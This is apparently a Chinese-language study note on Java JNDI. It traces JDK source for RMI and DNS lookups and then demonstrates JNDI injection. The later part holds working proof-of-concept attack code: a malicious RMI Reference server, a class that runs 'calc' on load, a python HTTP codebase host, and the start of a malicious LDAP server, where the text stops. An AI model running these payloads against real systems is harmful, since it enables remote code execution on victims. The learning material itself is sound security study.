前面提到有命名服务/目录服务，简单了解一下\nJNDI包括命名服务（Naming Service）和目录服务（Directory Serrvice）。\n命名服务：一种通过名称来查找实际对象的服务。例如RMI中,Naming.lookup方法通过查找名称来获取远程对象的代理类。\n相关概念：\nName：名称。要在命名系统中查找对象，需要提供对象的名称 Naming Convention：命名规范。一个命名系统中的所有名称必须遵循的语法规范 Binding：绑定。一个名称和一个对象的关联 Reference：引用。一些命名服务系统不是直接存储对象，而是保存对象的引用。引用包含了如何访问实际对象的信息。 Address：地址。引用通常用一个或多个地址（通信端口）来表示 Context：上下文。一个上下文是一系列名称和对象的绑定的集合。一个上下文中的名称可以绑定到一个具有相同命名规范的上下文中，成为子上下文（subcontext）。例如：在文件系统中，/usr是一个Context，/usr/bin是usr的subcontext。 Naming System：命名系统。一个相同类型的上下文集合 Namespace：命名空间。一个命名系统的所有名称的集合 Atomic Name：原子名。一个简单基本结构 Compound Name：混合名。由多个原子名一起构成的名称 Composite Name：复合名称。是跨越多个命名系统的名称 目录服务：是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象，目录对象可以跟属性关联，一个目录是由相关联的目录对象组成的系统。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。\n相关概念：\nAttribute：属性。一个目录对象可以包含属性。一个属性具有一个属性标识符和一系列属性值。 Search Filter：查找过滤器。通常还提供通过目录对象的属性来查找对象的操作。 重点说明 还有几个点需要说明一下，\n前面概念中重点标注出来的几个点，现在再稍微说明一下：\nReference引用，重点就是上面标注出来的说明。\nContext（上下文）：所谓上下文，是你当前执行程序的一个环境，存储了系统的一些初始化信息。\n就比如学习Tomcat内存马时，提到的一个StandardContext对象，当时就是为了通过这个对象来获取到当前应用的信息，即这对象可以看作当前web程序的“资源”。\nJNDI也一样，提供了InitialContext对象来为我们获取命名服务资源，提供InitialDirContext对象来为我们获取目录服务资源。\n还有一个Context类：\nContext接口：命名服务在初始化上下文中，我们就用到了Context接口中定义的变量，分别用到了INITIAL_CONTEXT_FACTORY和PROVIDER_URL。 INITIAL_CONTEXT_FACTORY：保存环境属性名称的常量，用于指定要使用的初始上下文工厂。该属性的值应该是将创建初始上下文的工厂类完全限定类名。\nPROVIDER_URL：保存环境属性名称的常量，用于指定服务提供者要使用的配置信息。该属性的值应包含一个URL字符串。\nJNDI架构简单学习 JNDI架构提供了一个标准的、与命名系统无关的API，这个API构建在特定于命名系统的驱动程序之上。这一层有助于把应用程序和实际的数据源隔离开来，因此无论应用程序是访问LDAP、RMI、DNS还是其他的目录服务，这都没有关系。换句话说，JNDI与任何特定的目录服务实现无关，您可以使用任何目录，只要您拥有相应的服务提供程序接口（或驱动程序）即可，如下图所示：\n其实就是在RMI等服务外面再套了一层API，方便调用。\nJNDI-协议转换 如果JNDI在lookup时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创还能处理对象的服务请求。\nJNDI默认支持自动转换的协议有：\n协议名称 协议URL Context类 DNS协议 dns:// com.sun.jndi.url.dns.dnsURLContext RMI协议 rmi:// com.sun.jndi.url.rmi.rmiURLContext LDAP协议 ldap:// com.sun.jndi.url.ldap.ldapURLContext LDAP协议 ldaps:// com.sun.jndi.url.ldaps.ldapsURLContextFactory IIOP对象请求代理协议 iiop:// com.sun.jndi.url.iiop.iiopURLContext IIOP对象请求代理协议 iiopname:// com.sun.jndi.url.iiopname.iiopnameURLContextFactory IIOP对象请求代理协议 corbaname:// com.sun.jndi.url.corbaname.corbanameURLContextFactory 以后面的RMI代码片段为例：\n1 2 3 4 5 6 // 创建JNDI目录服务上下文 InitialContext context = new InitialContext(); // 查找JNDI目录服务绑定的对象 RemoteInterface o = (RemoteInterface)context.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); System.out.println(o.sayHello()); 这里也会可以成功调用一个sayHello()方法：\n本来lookup这里只需要传参“Hello\u0026quot;即可，但是就需要进行环境配置，这样传入也能正常获取代理对象并调用方法，这得益于这里的lookup()会动态地识别用户要调用的服务以及路径，然后就会自动使用rmiURLContext处理RMI请求，也是在jndi注入中比较常用的一点。\nJNDI的接口实现 测试环境：\nJDK 8u71 JNDI-RMI服务 RMI的服务处理工厂类是：com.sun.jndi.rmi.registry.RegistryContextFactory，在调用远程的RMI方法之前需要先启动RMI服务，然后就可以使用JNDI来连接并调用了。\n基本代码 先开启一个RMI服务，直接用之前的代码即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package Rmi.Server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer{ public static void main(String[] args){ try { //创建注册中心 LocateRegistry.createRegistry(1099); System.out.println(\u0026#34;Server start\u0026#34;); //绑定调用类 RemoteInterface remoteTest = new RemoteTest(); Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); }catch(Exception e){ e.printStackTrace(); } } } 在访问JNDI目录服务时会通过预先设置好环境变量访问对应的服务：\n1 2 3 Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;rmi://localhost:1099\u0026#34;); 简单理解就是通过Context.INITIAL_CONTEXT_FACTORY告诉JNDI我要访问何种服务，通过Context.PROVIDER_URL告诉JNDI所要访问服务的路径。\n然后就是初始化上下文，传入我们设置好的环境变量：\n1 Context initialContext = new InitialContext(env); 还有另外一种类似的获取上下文的操作，即不指定环境变量，那么JNDI会自动搜索系统属性System.getProperty()、applet参数和应用程序资源文件jndi.properties，所以我们也可以通过System.setProperty()设置环境变量：\n1 2 3 4 System.setProperty(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); System.setProperty(Context.PROVIDER_URL,\u0026#34;rmi://localhost:1099\u0026#34;); InitialContext initialContext = new InitialContext(); 然后利用提供的lookup()方法，通过查询名字获取远程对象代理类：\n1 2 3 4 //获取远程代理类 RemoteInterface o = (RemoteInterface) initialContext.lookup(\u0026#34;Hello\u0026#34;); //调用远程对象的方法 System.out.println(o.sayHello()); 所以完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package JNDI; import java.util.Hashtable; import javax.naming.Context; import Rmi.Server.RemoteInterface; import javax.naming.InitialContext; public class JNDI_Main { public static void main(String[] args) throws Exception { Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;rmi://localhost:1099\u0026#34;); Context initialContext = new InitialContext(env); //获取远程代理类 RemoteInterface o = (RemoteInterface) initialContext.lookup(\u0026#34;Hello\u0026#34;); //调用远程对象的方法 System.out.println(o.sayHello()); } } 成功调用方法：\n源码分析 命名服务初始化上下文 对应代码为：\n1 Context initialContext = new InitialContext(env); 有前面的代码可以看出，这里我们是传入了一个Hashtable类，里面包含了构造的两个键值对。看看会对这个进行什么处理跟进一下这里的InitialContext类的构造方法（注意要先启动RMI的Server端）：\n如预期，有键值对，这里的clone()方法简单来说就是一个拷贝的操作，其实调用这个方法后的Hashtable类与原先没有太大区别，这个方法后的environment参数也是没有问题的。\n然后调用了init()方法，并往里面传进了environment，跟进这个方法：\n然后这里调用了ResourceManager#getInitialEnvironment()方法，简单跟进一下，几个重点代码：\n获取applet参数的代码：\n两个点，\n第一个框，获取到VersionHelper类的PROPS变量，变量定义如下： 里面就有我们原先放入的两个变量，这个变量记录了Context接口的常量信息，所以现在就是将props变量赋值为了上面的包含Context接口常量信息的数组\n第二个框，就是从Hashtable中获取以APPLET变量为值的键的值，在Context接口中的APPLET变量定义： 很明显我们当初并没有往Hashtable类放入这个变量，所以这里就是一个空，即为null。\n继续往后面看，代码如下：\n这里的helper变量定义：\n跟进VersionHelper#getVersionHelper()方法：\n所以其实也就是获取到VersionHelper12类实例。所以在前面的方法调用中，其实是会调用VersionHelper12类的getJndiProperties()方法，简单看了一下，很像在调用System.getProperty()方法，这里会返回一个数组，结果全为null：\n然后就调用了for循环，几个关键点：\n这里就是调用了前面的数组，如果在Hashtable类中存在数组中的一个值，那么就直接进入下一个for循环，可以想出只会有两次操作是直接进入下一个for循环，那么没有定义的呢，就会进入到if条件语句，并且在前面可以知道获取到的applet变量为null，所以其实就是调用的下面的代码：\n没啥大的分析过程，最后还是返回的这个Hashtable类：\n可能是因为我指定了环境变量，没有使用setProperty()方法来放变量。可以换代码再跟一下，过程有细微差别，但不影响，最后在jndiSysProps变量的赋值确实有不同： 大差不差，就是前面会实例化一个Hashtable类，后面会调用Hashtable类的put()方法\n还是会构造成一个Hashtable类。\n所以最终结果还是这个Hashtable类：\nResourceManager#getInitialEnvironment()方法分析结束。\n所以这个步骤的目的就是确保后面能传入一个“填充”好的Hashtable类。\n————————\n回到InitialContext类的init()方法，再粘过来一次代码：\n然后后面无疑会调用getDefaultInitCtx()方法： 所以现在会调用NamingManager类的getInitialContext()方法，并传入了前面构造了的Hastable类，跟进这个方法：\n按顺序解析一下这个方法在干嘛。\n首先调用了getInitialContextFactoryBuilder()方法，跟进一下： 所以会返回null，然后就会进入后面的if条件：\n所以很正常这里会获取到env变量（Hashtable类）的INITIAL_CONTEXT_FACTORY，所以也就是前面的RegistryContextFactory类，所以后面就不会进入if条件。\n继续往后看：\n所以这里应该就是会加载这个类为Class对象，然后对这个Class对象调用newInstance()方法将其实例化。所以这里就是会获取到RegistryContextFactory类实例：\n并将这个实例化类赋值给了factory变量，再往后看，就会到如下代码： 所以现在会调用RegistryContextFactory类的getInitialContext()方法，并传入了env变量（就是Hashtable类），跟进getInitialContext()方法：\n现在又对这个Hashatble类调用了clone()方法，“克隆”一次？先将其理解为就是前面传入的Hashtable类。然后聚焦于return调用的两个方法，分别跟进一下：\ngetInitCtxURL(var1)： 这里容易看出会进入if条件，然后对这个Hashtable类调用了取值的操作，这里也就是前面放进的值，所以会将var2变量赋值为\u0026quot;rmi://localhost:1099\u0026quot;，所以最终这个getInitCtxURL()方法就是返回了这个var2，即\u0026quot;rmi://localhost:1099\u0026quot;，也就是获取“环境变量”指定的服务地址。\nURLToContext()方法： 代码如上，简单说明一下参数问题：（var0 ==》 rmi://localhost:1099 ； var1 ==》 Hashtable类），在这个方法中，可以看到又实例化了一个rmiURLContextFactory类，然后调用了这个类的getObjectInstance()方法（传入了var0和var1），跟进一下：\n可以看出来这里会进入到第一个else if语句，所以现在会调用getUsingURL()方法，继续跟进： 喔，简单瞟一眼，看到了一个老朋友，lookup()方法，有点意思。现在来跟一下这里的方法源码：\n这里先实例化了一个rmiURLContext类，并传入了var1（Hashtable类），简单跟一下这里的初始化过程：\n先跟进rmiURLContext类的父类GenericURLContext类的构造方法： 所以这里就是将GenericURLContext类的myEnv变量赋值为Hashtable类： 回到rmiURLContextFactory类的getUsingURL()方法： 来看看这里的lookup()方法会干嘛，所以现在会调用rmiURLContext类的lookup()方法，但是rmiURLContext类没有lookup()方法，所以会调用到父类GenericURLContext类的lookup()方法（传入了var0，如上图所示的变量）：\n跟进这里的getRootURLContext()方法，传入了var1参数和刚好在前面初始化类时赋值的变量myEnv（也就是Hashtable类），简单跟跟，说几个重点，方法结果如下：\n这里可以看到实例化了两个类，对应代码如下： 前面的CompositeName类的初始化就不多说了，重点看RegistryContext类的初始化：\n就是将这里的environment变量赋值为了Hashtable类实例，然后将这里的registry、host、port变量分别赋值，简单跟一下这里的getRegistry()方法：\n如下：\n然后又会调用LocateRegistry类的getRegistry()方法： 调用另一个重载的getRegistry()方法，在方法最后见到了老朋友：\n在这个方法中，会创建RegistryImpl_Stub类： 最后也就会返回这个RegistryImpl_Stub类。（后面再碰到的getRootURLContext()方法都是差不多的）\n回到RegistryContext类的构造方法然后host和port的赋值： 最后在rmiURLContext类的getRootURLContext()方法将CompositeName类和RegistryContext封装进了ResolveResult类并返回了它。\n——————\n回到lookup()方法，然后后面调用的两个方法：getResolvedObj()和getRemainingName()方法，都是获取变量值的操作，对应上面结果中的ResolveResult类中的两个变量。\n所以后面的var3变量的值为RegistryContext类实例：\n这几个变量的值还是挺重要的。\n——————\n后面又会调用RegistryContext类的lookup()方法：\n这里的var2.getRemainingName会返回前面说过的变量，值为：\n也还是对应前面的var2中的变量。\n继续跟进RegistryContext类的lookup()方法，传入了CompositeName类实例：\n然后这里会进入第一个if条件，会实例化一个RegistryContext类并返回它，在实例化时会进行一些初始化操作：\n最后返回了这个RegistryContext类，这个类还是包含了一下重要信息。\n然后简单跟了一下return的部分，最后就是将InitialContext类的defaultInitCtx变量赋值为了这刚RegistyContext类。\n命名服务获取对象 对应代码：\n1 RemoteInterface o = (RemoteInterface) initialContext.lookup(\u0026#34;Hello\u0026#34;); 前面获取到了InitialContext类并进行了一些重要的赋值操作，类变量定义如下：\n所以现在会调用InitialContext类的lookup()方法：\n先跟进一下这里的getURLOrDefaultInitCtx()方法：\n第一个if条件不会进入，跟一下还是很好看出的，这里不多赘述。\n后面的schema的值为null，调用的getURLSchema()方法也是容易看的。\n所以最后会调用getDefaultInitCtx()方法，又是这个方法，但是这里却直接返回值，如下：\n由于前面初始化时会将这里的gotDefault变量设置为true，所以这里会直接返回定义的defaultInitCtx变量，即前面的RegistryContext类实例。\n即getURLOrDefaultInitCtx(name)的调用就是获取RegistryContext类实例。\n———\n回到InitialContext类的lookup()方法，所以现在会调用RegistryContext类的lookup()方法，并传入了Hello这个参数变量：\n两个点，都跟一下：\nCompositeName类的初始化： 也就是给CompositeName类的impl变量赋值。\n调用了RegistryContext类的另一个lookup()方法，并将前面的CompositeName类传了进去： 这里又调用了这个lookup()方法，但是有很明显的区别，就是这里的var1有值。就简单理解为将一个字符串名转换成对应的Name类型对象。所以现在会进入else语句： 然后就会调用RegistryImpl_Stub类的lookup()方法，用来查找RMI服务：\n也就是比较熟悉的操作了：\n最后这里反序列化获取代理对象。\n也就是那个代理对象： 后续代码的方法调用就和RMI的差不多了。\n最终成功达到访问一次RMI服务的操作。\n补充说明 动态协议切换 在前面的协议转换中，提到了一个不需指定环境变量，可以通过服务地址直接获取到相应对象，完整实现代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package JNDI; import Rmi.Server.RemoteInterface; import javax.naming.InitialContext; public class JNDI_Main { public static void main(String[] args) throws Exception { // 创建JNDI目录服务上下文 InitialContext context = new InitialContext(); // 查找JNDI目录服务绑定的对象 RemoteInterface o = (RemoteInterface)context.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); System.out.println(o.sayHello()); } } （注意起RMI Server服务）\n这样也能实现一次远程方法调用。\n现在来分析一下过程，一步一步来：\n命名服务初始化 对应代码：\n1 InitialContext context = new InitialContext(); 这里的过程其实都和前面将要求的值放入如环境属性中差不多的，刚好前面只是略过，这里稍微详细讲讲：\n调用的构造方法：\n调用Init()方法： 跟进ResourceManager类的getInitialEnvironment()方法：\n前面实例化了一个Hashtable类，后面的getJndiProperty()方法中有读取环境属性的代码，如果读取到了就会放进Hashtable类中，但是我们并没有往环境属性中放东西，所以最终返回的这个Hashtable类是空的：\n所以后续的调用get()方法是无法获取值的，所以就直接结束初始化了：\n命名服务获取对象 对应代码：\n1 RemoteInterface o = (RemoteInterface)context.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); 会调用InitialContext类的lookup()方法： 还是分别跟一下：\n又是getURLOrDefaultInitCtx()方法： 但是这里就有不同地方了，这里跟进getURLSchema()方法：\n无疑这里会匹配到:和/特殊符号，所以现在会进入if条件语句而不是直接返回null。\n在if语句中，进行了字符串的截取工作，所以会返回rmi这个字符串。\n继续往后看：\n然后就会进入这个if语句，会调用NamingManage.getURLContext()方法（这里传入了rmi字符串和一个空的Hashtable类）：\n然后调用了getURLObject()方法： 喔，getFactory()方法，感觉很像获取工厂类的方法，有搞头，此时的参数情况：\n这就已经看到了包含有rmiURLContextFactory的字符串，也是参数传递时确实应该形成的，跟进ResourceManager类的getFactory()方法，关键代码如下：\nparser.nextToken方法返回com.sun.jndi.url字符串，classSuffix就是传入的.rmi.rmiURLContextFactory，所以className变量定义如下：\n所以这里找到了工厂类并实例化，最后还返回了这个对象。\n所以这里的getFactory()方法就是获取工厂类对象。\n————\n回到NamingManager类的getURLObject()方法：\n所以现在会调用工厂类rmiURLContextFactory类的getObjectInstance()方法，这里的参数分别为：（null、null、null、空的Hashtable类），跟进这个方法：\n所以就是实例化一个rmiURLContext类，传入了一个空的Hashtable类，将其父类的父类GenericURLContext的myEnv变量赋值为了Hashtable类。\n所以之类的getURLObject()方法就是获取到一个rmiURLContext类。\n————\n回到NamingManager类的getURLContext类：\n毫无疑问这里符合第一个if条件，所以会返回这个rmiURLContext类\n————\n回到InitialContext类的getURLOrDefaultInitCtx()方法：\n符合条件，直接返回这个rmiURLContext类，不会像之前一样调用getDefaultInitCtx()方法。\n综上所述，这里的getURLOrDefaultInitCtx(name)方法就是会得到一个rmiURLContext类，但是里面的Hashtable类为空。\n————————\nlookup(name)： 跟进rmiURLContext类的lookup()方法（实际调用的是其父类GenericURLContext的lookup()方法）： 前面也遇到过这个方法，和前面差不多了，var2为ResolveResult类对象，包含的两个变量（变量值有点不同）：\n后续的两个getter都是获取这里两个值，两个值的情况：\n调用了RegistryContext类的lookup()方法：\n跟进lookup()方法：\n所以会进入else语句，然后就会调用RegistryImpl_Stub类的lookup()方法查找“Hello”的服务：\n同样符合RMI的过程。\nJNDI-DNS服务 JNDI支持访问DNS服务，注册环境变量时设置JNDI服务处理的工厂类是com.sun.jndi.dns.DnsContextFactory类。\n基本代码 DNS服务就是为了解析域名，代码和前面JNDI-RMI代码大相径庭：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package JNDI; import java.util.Hashtable; import javax.naming.Context; import javax.naming.directory.InitialDirContext; import javax.naming.directory.DirContext; import javax.naming.directory.Attributes; public class JNDI_Main { public static void main(String[] args) throws Exception { Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.dns.DnsContextFactory\u0026#34;); env.put(Context.PROVIDER_URL,\u0026#34;dns://114.114.114.114\u0026#34;); // 创建JNDI目录服务对象 DirContext context = new InitialDirContext(env); // 获取DNS解析记录测试 Attributes attrs1 = context.getAttributes(\u0026#34;baidu.com\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); System.out.println(attrs1); } } 这里是从dns://114.114.114.114这个dns服务器上查询www.baidu.com域名的ip地址，这里用的是JNDI目录服务，目录服务允许目录对象具有属性，那么同样也可以有值。\n同样的，还可以不设置环境变量，将其放进系统属性中，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package JNDI; import java.util.Hashtable; import javax.naming.Context; import javax.naming.directory.InitialDirContext; import javax.naming.directory.DirContext; import javax.naming.directory.Attributes; public class JNDI_Main { public static void main(String[] args) throws Exception { System.setProperty(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.dns.DnsContextFactory\u0026#34;); System.setProperty(Context.PROVIDER_URL,\u0026#34;dns://114.114.114.114\u0026#34;); // 创建JNDI目录服务对象 DirContext context = new InitialDirContext(); // 获取DNS解析记录测试 Attributes attrs1 = context.getAttributes(\u0026#34;baidu.com\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); System.out.println(attrs1); } } 源码分析 目录服务初始化上下文 对应代码：\n1 DirContext context = new InitialDirContext(env); 跟进初始化过程： 这里进行类的初始化的是InitialDirContext类，而它的父类是InitialContext类，所以这里其实还是初始化的InitialContext类，并同样传入了Hashtable类，只不过里面放入的值是不同的。\n后面的具体过程还是和前面命名服务初始化差不多的，就从不一样的地方开始看看：\n在NamingManage类的getInitialContext()方法中，最后会调用DnsContextFactory类的getInitialContext()方法：\n然后调用DnsContextFactory类的ulToContext()方法，参数分别为dns://114.114.114.114、DNS服务的Hashtable类： 最后会调用getContext()方法，参数分别为：\n继续跟进：\n所以这里是初始化了一个DnsContext类，进行了一些赋值操作： 最后返回了这个DnsContext类实例。\n所以这里的步骤同样是将InitialDiContext类的父类InitialContext类变量defaultInitCtx变量赋值为DnsContext类实例，并将gotDefault变量赋值为tue。\n——————\n目录服务获取属性 对应代码：\n1 Attributes attrs1 = context.getAttributes(\u0026#34;baidu.com\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); 在前面的初始化后，现在的context值是一个InitialDiContext类，变量定义为：\n所以现在会调用InitialDiContext类的getAttibutes()方法：\n还是两个点，\n先跟进getURLOrDefaultInitDirCtx(name)： 跟进这里的getURLOrDefaultInitCtx()方法：\n还是同样的，会直接调用最后的getDefaultInitCtx()方法，前面的代码跟一下源码即可，挺好看懂的：\n同样的直接返回DnsContext类实例。并且在InitialDirContext类的getURLOrDefaultInitDirCtx()方法也是直接返回这个DnsContext类实例：\n所以这里的第一个点就是获取DnsContext类实例。\n————\n跟进getAttributes(name, attrIds)代码： 所以现在是会调用DnsContext类的父类的父类PartialCompositeDirContext的getAttibutes()方法，跟进：\n还是先简单看一下CompositeName类的初始化：\n同样的还是将CompositeName类的impl变量赋值为这个。\n但其实可以直接看作badidu.com，继续跟代码，所以现在会调用另一个重载的getAttributes()方法：\n按顺序简单说说：\n先是将这里的var3变量赋值为了DnsContext类实例。\n然后调用了p_getEnvironment()方法，实际上会调用DnsContext类的这个方法：\n直接返回了Hashtable类实例。\n然后实例化了一个Continuation类： 传入了这个字符串和Hashtable类实例。\n然后到了for循环，会调用DnsContext父类ComponentDirContext的p_getAttributes()方法： 这里的var4变量是一个HeadTail类实例，后续的HeadTail.getStatus返回2，会调用c_getAttributes方法（getHead()方法返回的是“baidu.com\u0026quot;）：\n查询逻辑为：\n所以这里实际会调用DnsClient类的quey()方法，然后又会调用到doUdpQuery()方法：\n前面的send()方法就是进行连接，发送请求到相应的DNS服务器，后一个就是获取数据。\n最后query()方法结束获得的数据：\n最后得到数据：\n——————————\nJNDI攻击 在学习JNDI攻击前，先简单了解两个知识点。\n前置知识了解 Reference类了解 该类位于javax.naming.Reference，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。\n一个示例代码：\n1 2 String url = \u0026#34;http://127.0.0.1:8080\u0026#34;; Reference reference = new Reference(\u0026#34;test\u0026#34;, \u0026#34;test\u0026#34;, url); 利用的构造函数：\n这里涉及到的三个变量:\n就是将这个类的这三个参数赋值为对应的参数。\n就利用来说，三个参数可以如下理解：\nclassName：远程加载时所使用的类名，本地找不到，就去远程加载 classFactory：加载class中需要实例化类的名称 classFactoryLocation：工厂加载的地址，提供classes数据的地址（可以是file/ftp/http协议） 后面用一个实例来说明一下利用。\n远程对象引用安全限制 RMI服务中引用远程对象将受本地Java环境的限制，需要java.rmi.server.useCodebaseOnly配置必须为false，表示允许加载除了Classpath外的远程对象。\n而在JNDI获取RMI服务中，被引用的远程工厂对象也将受com.sun.jndi.rmi.object.trustURLCodebase配置限制，为false表示不信任远程引用对象，就不能调用远程的引用对象\nJNDI-RMI注入 示例代码 先给注入方法操作一下：\nRMI Server端代码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDI_RMI_Server{ public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { String url = \u0026#34;http://127.0.0.1:7979/\u0026#34;; Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\u0026#34;JNDI_Main\u0026#34;, \u0026#34;JNDI_Main\u0026#34;, url); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\u0026#34;Hello\u0026#34;,referenceWrapper); System.out.println(\u0026#34;running\u0026#34;); } } 这里需要将前面的Reference对象传进ReferenceWrapper，这是因为Reference类没有实现Remote接口也没有继承UnicastRemoteObject类，所以这里用ReferenceWrapper类将其封装了一下。\nRMIClient端代码： 1 2 3 4 5 6 7 8 9 10 11 package JNDI; import javax.naming.InitialContext; public class JNDI_RMI_Client{ public static void main(String[] args) throws Exception { String url = \u0026#34;rmi://localhost:1099/Hello\u0026#34;; InitialContext initialContext = new InitialContext(); initialContext.lookup(url); } } 然后需要准备一个远程加载的类： 1 2 3 4 5 6 7 8 9 import java.lang.Runtime; public class JNDI_Main { public JNDI_Main() throws Exception{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } //注意这里不能有包名，自己本地打踩了一下坑，也许其他环境不会有这个问题 然后使用javac命令将这个文件打成class文件，然后再用python起一个HTTP服务：\n1 python -m http.server 7979 然后运行Server端，再运行Client发起请求，成功弹出计算机： 原理简单来说就是把引用了恶意类的Reference类绑定到RMI的Registry中。\n在客户端调用lookup远程获取远程类的时候，就会获取到Reference对象，就会去寻找Reference中指定的类，如果查找不到则会在Reference中指定的远程地址去进行请求，请求到远程的类后会在本地执行。\n这里其实算攻击客户端。\n代码调试 JNDI_RMI_Server端 大致还是和RMI服务端的创建是差不多的，主要是为了看看引用类中的赋值情况。\n大概看了一下，Reference类还是和前面说的差不多，主要看看ReferenceWrapper的赋值情况：\n也就是将这里的wrapper变量赋值为Reference类。\n稍微关注一下这里的getReference()方法。\n最后在注册表中将RMI服务和ReferenceWrapper对象绑定在一起。\nJNDI_RMI_Client端 打断点于lookup()方法，所以现在会调用InitialContext类的lookup()方法：\n前面一部分其实是和RMI服务动态协议转换那里差不多的，主要从不同的地方说起，直接到调用RegistryImpl_Stub类的lookup()方法结束： 此时的变量情况： 在前面的RMI接口实现中分析这里在调用lookup()方法后会得到代理对象，但是如上图所示，这里会得到一个ReferenceWrapper_Stub类，跟进这里的decodeObject()方法： 这里的ReferenceWrapper_Stub类实现了RemoteReference接口，所以这里会调用ReferenceWrapper_Stub类的getReference()方法：\n这里又调用了UnicastRef类的invoke()方法进行数据传输，得到了Reference对象并将其返回，所以现在var的值为：\n然后又调用了NamingManager类的getObjectInstance()方法： 变量情况：\n跟进NamingManager类的getObjectInstance()方法： 部分代码，每部分都分析一下：\n这里会调用getObjectFactoyBuilder()方法，这里就是会返回变量的值，但是这里的值默认为null，所以不会进入后面的if条件。\n看后面的代码：\nrefInfo就是参数传递的Reference类，符合第一个if条件，所以现在会将ref变量赋值为这个Reference类。\n再往后面看，会进入第一个if语句，会将f赋值为前面Reference类初始化时传的参，如下：\n即要初始化的类。\n所以现在会进入第二个if条件：\n所以现在会调用getObjectFactoryFromReference()方法（注意传入了Reference类和这个classFactory）：\n可以看到有加载类的操作，也就是恶意类JNDI_Main。在第二个loadClass()方法获取到了JNDI_Main类的class对象，第一个应该是先在本地找，找不到就去工厂路径找：\n并且后面有实例化类的操作： 很明显会实例化类成功调用恶意方法。\n在弹计算机后就进入异常输出，整个过程结束：\nJNDI-Ldap注入 LDAP也是一种目录服务，前面分析的DNS其实只用客户端就能完成一次完整的服务，在这里我们可以利用LDAP这个目录服务来完成一次攻击。\n思路是差不多的，当查询属性的值时，我们返回一个存储恶意类的Reference类给客户端，让客户端根据codebase路径查找工厂。\n需要用需要引入unboundid-ldapsdk-3.2.0.jar包，直接在pom.xml引入即可：\n1 2 3 4 5 6 7 \u0026lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 基本代码 恶意LDAP服务端：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 package JNDI; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LDAP_EVIL_Server { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main ( String[] tmp_args ) { String[] args=new String[]{\u0026#34;http://127.0.0.1:8888/#Test\u0026#34;}; int port = 2333; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, //$NON-NLS-1$ InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); 